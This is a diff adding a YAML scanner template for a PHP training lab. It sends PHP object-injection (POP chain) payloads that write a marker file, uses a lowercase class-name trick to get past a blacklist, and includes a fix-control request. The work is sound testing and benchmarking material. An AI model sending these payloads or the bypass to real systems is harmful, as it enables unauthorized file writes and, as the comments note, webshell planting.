@@ -1,0 +1,203 @@
+id: vulnlab-php-unserialize-pop-chain
+
+info:
+  name: PHP 反序列化（POP 链写文件）
+  severity: critical
+  author: hediwen
+  tags: [php, deserialization, unserialize, pop-chain, rce]
+
+  description: |
+    用户输入被直接交给 `unserialize()`，且未限制可实例化的类，
+    导致可以构造 POP 链（Property-Oriented Programming），
+    让已有的魔术方法在反序列化过程中自动执行并触达危险操作。
+
+    本靶场的链终点是**写文件**（`FileStore::write()`），
+    真实环境里通常是写 WebShell 或套用框架内部的 gadget 链。
+
+    ── 为什么这个检测几乎没有副作用 ──
+
+    与其他 RCE 类检测不同，反序列化检测**不需要注入命令** ——
+    链的终点由目标代码自己决定。本靶场的终点恰好是写文件，
+    所以只能通过「文件是否被写出来」来确认。
+
+    为了把这个副作用控制在最小范围：
+      · 只写一个 `.txt` 文件，不写可执行后缀
+      · 内容是一个固定标记串（VULNLAB_POP_CHAIN_OK），不是任何形式的代码
+      · 文件名固定（pop.txt），重复执行会覆盖，不会堆积垃圾
+
+    ⚠️ 真实授权测试中，如果链的终点是 `system()` / `eval()` 这类，
+    应当**先确认终点是什么再决定是否发送** ——
+    反序列化的检测载荷不同于 SQL 注入，它会真的执行目标代码里的那段逻辑。
+
+    ── 一个隐蔽的前置条件：$dir 是相对路径 ──
+
+    链的终点是 `file_put_contents($this->dir . $key, $value)`，
+    而**相对路径按进程的当前工作目录解析**。PHP 内置服务器会把 CWD
+    切到被请求脚本所在的目录（本请求是 html/unserialize/），
+    所以 `$dir` 必须是 `../uploads/` 才能落到 html/uploads/。
+
+    写错不会有任何报错 —— 靶场代码里用了 `@` 抑制，
+    而 `file_put_contents` 失败只是返回 false。页面只会显示「没有新文件」。
+
+    这类「静默失败」是检测类工作里最费时间的一类问题：
+    **看起来像漏洞不存在，其实是载荷本身没生效。**
+
+    ── 判据为什么不能看 payload 回显 ──
+
+    靶场页面会把提交的 payload 原样回显到 `<textarea>` 里。
+    如果判据写成「响应中出现 `Cache` 或 `FileStore`」，会**必然命中** ——
+    那是页面在展示输入，不是漏洞被利用了。
+
+    所以判据限定在靶场自己的**副作用检查区块**里：
+
+        ★ 产生了 N 个新文件 —— POP 链生效
+
+    这段文字是服务端对比 `unserialize()` 前后 `uploads/` 目录差异后生成的，
+    只有文件真的落盘才会出现。这比匹配 payload 回显可靠得多，
+    也和 ASP 项目里「负向对照校验」的思路一致：
+    **排除「检测特征由检测行为本身制造」的可能。**
+
+    同时反向排除「过滤器命中」与 PHP 致命错误，避免把拦截误判为命中。
+
+  reference:
+    - https://www.php.net/manual/en/function.unserialize.php
+    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
+    - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+
+requests:
+  # ── ① low 档：零约束，标准 payload 直接生效 ──────────────────────
+  #
+  # payload 结构（逐段对照）：
+  #
+  #   O:5:"Cache":3:{                          ← 实例化 Cache（3 个属性）
+  #     s:3:"key";   s:7:"pop.txt";
+  #     s:5:"value"; s:20:"VULNLAB_POP_CHAIN_OK";
+  #     s:5:"store";                           ← $store 是链的"接头"
+  #       O:9:"FileStore":1:{ s:3:"dir"; s:13:"html/uploads/"; }
+  #   }
+  #
+  # 触发不需要任何额外动作：对象在脚本结束时被销毁，
+  # Cache::__destruct() 自动调用 $store->write($key, $value)。
+  #
+  # ── 写入目录为什么是 ../uploads/ ──
+  #
+  # PHP 内置服务器会把**当前工作目录切到被请求脚本所在目录**。
+  # 本请求打到 /unserialize/low.php，所以进程的 CWD 是 html/unserialize/，
+  # 从这个位置走到 uploads 目录就是 ../uploads/。
+  #
+  # 这一点实测确认过（在 html/ 和 html/unserialize/ 各放一个探针脚本
+  # 打印 getcwd()，两者结果不同）。也正因为 CWD 会随部署方式变化，
+  # 靶场页面会把「当前该写什么」直接算出来展示给使用者 ——
+  # 见 html/lib/paths.php 的 render_target_dir_hint()。
+  #
+  # 注意 payload 里的长度前缀 s:11: 是 "../uploads/" 的字节数。
+  - method: POST
+    path:
+      - "{{BaseURL}}/unserialize/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "data=O%3A5%3A%22Cache%22%3A3%3A%7Bs%3A3%3A%22key%22%3Bs%3A11%3A%22pop_low.txt%22%3Bs%3A5%3A%22value%22%3Bs%3A20%3A%22VULNLAB_POP_CHAIN_OK%22%3Bs%3A5%3A%22store%22%3BO%3A9%3A%22FileStore%22%3A1%3A%7Bs%3A3%3A%22dir%22%3Bs%3A11%3A%22..%2Fuploads%2F%22%3B%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 靶场自己的副作用检查结论 —— 只有文件真的落盘才会出现
+      - type: regex
+        part: body
+        regex:
+          - "(?s)产生了\\s*\\d+\\s*个新文件"
+          - "(?s)POP\\s*链生效"
+
+      # 反向保险：被拦截 / 反序列化失败都不算命中
+      - type: word
+        part: body
+        words:
+          - "过滤器命中"
+          - "反序列化失败"
+          - "Fatal error"
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: written_file
+        regex:
+          - '<td class="mono">([^<]+\.txt)</td>'
+
+  # ── ② medium 档：类名大小写绕过黑名单 ────────────────────────────
+  #
+  # 注意这里用的是 pop_medium.txt，和 ① 的 pop_low.txt 不同名。
+  # 原因：靶场的副作用检查比对的是「**新增**文件」——
+  # 如果三档都写同一个文件名，第一次之后目录里就已经有它了，
+  # 后面的请求只是在覆盖，检查看不到"新增"，会被误判成没打通。
+  # 冠以档位后缀就能让每条载荷的副作用各自独立、可被单独观察到。
+  #
+  # 该档用 `strpos($data, 'Cache')` 做黑名单，而 **PHP 类名不区分大小写**。
+  # 把 payload 里的类名全改成小写，过滤器看不到 `Cache` 字样，
+  # 运行时却依然实例化出真正的 Cache 类。
+  #
+  # 判据与 ① 相同 —— 但额外确认没有被过滤器拦下，
+  # 这样「命中」与「被拦」两种结果不会混在一条结果里。
+  - method: POST
+    path:
+      - "{{BaseURL}}/unserialize/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "data=O%3A5%3A%22cache%22%3A3%3A%7Bs%3A3%3A%22key%22%3Bs%3A14%3A%22pop_medium.txt%22%3Bs%3A5%3A%22value%22%3Bs%3A20%3A%22VULNLAB_POP_CHAIN_OK%22%3Bs%3A5%3A%22store%22%3BO%3A9%3A%22filestore%22%3A1%3A%7Bs%3A3%3A%22dir%22%3Bs%3A11%3A%22..%2Fuploads%2F%22%3B%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "(?s)产生了\\s*\\d+\\s*个新文件"
+
+      - type: word
+        part: body
+        words: ["过滤器命中", "反序列化失败"]
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: bypass_variant
+        regex:
+          - 'O%3A5%3A%22cache%22|O:5:"cache"'
+
+  # ── ③ high 档：修复对照（预期不命中）────────────────────────────
+  #
+  # 这一条**不应该命中**。留在 PoC 里的意义有两个：
+  #
+  #   · 验证修复是否真的有效 —— 同一条 payload 打过去，白名单会拦下它
+  #   · 说明「同一份规则在漏洞版和修复版上的表现差异」——
+  #     这正是基准集的用法：拿来做检测器的对照，而不只是找漏洞
+  #
+  # 如果这条命中了，说明 `allowed_classes` 白名单被改坏了。
+  - method: POST
+    path:
+      - "{{BaseURL}}/unserialize/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "data=O%3A5%3A%22cache%22%3A3%3A%7Bs%3A3%3A%22key%22%3Bs%3A12%3A%22pop_high.txt%22%3Bs%3A5%3A%22value%22%3Bs%3A20%3A%22VULNLAB_POP_CHAIN_OK%22%3Bs%3A5%3A%22store%22%3BO%3A9%3A%22filestore%22%3A1%3A%7Bs%3A3%3A%22dir%22%3Bs%3A11%3A%22..%2Fuploads%2F%22%3B%7D%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "(?s)产生了\\s*\\d+\\s*个新文件"
+
+      - type: word
+        part: body
+        words: ["反序列化失败"]
+        negative: true
